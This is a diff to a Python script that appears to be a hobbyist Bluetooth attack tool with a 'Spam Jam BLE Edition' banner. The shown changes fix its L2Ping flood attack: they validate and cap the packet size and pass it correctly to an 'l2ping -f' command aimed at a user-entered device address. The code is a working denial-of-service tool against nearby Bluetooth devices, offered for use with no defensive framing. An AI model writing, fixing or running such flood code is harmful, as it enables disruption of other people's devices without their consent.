@@ -14,9 +14,9 @@ def print_banner():
 ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
 ███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
 ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
-   ❤️💜 A WORLD OF BLE FUN 💜❤️
+   ❤️💜 Spam Jam BLE Edition 💜❤️
    👩‍💻 Author: ekoms savior
-   🎯 Now with MORE Custom Attacks! 🎉
+   🎯 Now with Party Pooper + Custom Attacks! 🎉
    """)
     print("💜 XOXO HACK THE PLANET! 💜\n")
 
@@ -87,7 +87,7 @@ def scan_bluetooth():
     print("🔎 Scanning for Bluetooth devices...")
     subprocess.run(['bluetoothctl', 'scan', 'on'], check=True)
 
-# 💥 CUSTOM L2PING FLOOD ATTACK
+# 💥 CUSTOM L2PING FLOOD ATTACK (NOW FIXED!)
 def l2ping_attack():
     """Send a customizable Bluetooth L2Ping flood attack to a target device."""
     addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
@@ -98,15 +98,25 @@ def l2ping_attack():
         return
 
     # User-customized attack settings
-    packet_size = input("💜 Enter packet size (default 600): ") or "600"
+    packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
+    
+    try:
+        packet_size = int(packet_size)
+        if packet_size > 672:
+            print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
+            packet_size = 672  # Auto-correct max size!
+    except ValueError:
+        print("⚠️ Invalid input! Using default size: 600 bytes.")
+        packet_size = 600  # Default to 600 if input is bad
+    
     attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
     
     if attack_mode:
         print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', packet_size, '-f', addr], check=True)
+        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
     else:
         print(f"💥 Sending single {packet_size}-byte L2Ping packet to {addr}")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', packet_size, addr], check=True)
+        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), addr], check=True)
 
     print("✅ L2Ping attack complete!")
 
